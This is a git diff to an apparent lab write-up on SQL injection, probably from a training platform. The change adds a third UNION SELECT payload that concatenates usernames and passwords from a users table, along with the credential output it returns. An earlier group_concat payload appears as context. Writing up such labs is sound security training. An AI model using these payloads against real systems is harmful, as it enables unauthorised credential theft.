@@ -36,3 +36,13 @@ The last command dumps all databases, we'll know try to enumerate each one of th
 ' union select NULL,group\_concat(username,';',password) from users-- -
 
 <figure><img src="../../.gitbook/assets/2024-02-15 13_21_28-.png" alt=""><figcaption></figcaption></figure>
+
+## Option 3
+
+' UNION SELECT NULL,username || '\~' || password FROM users--
+
+## Result:
+
+administrator\~s3cure\
+wiener\~peter\
+carlos\~montoya
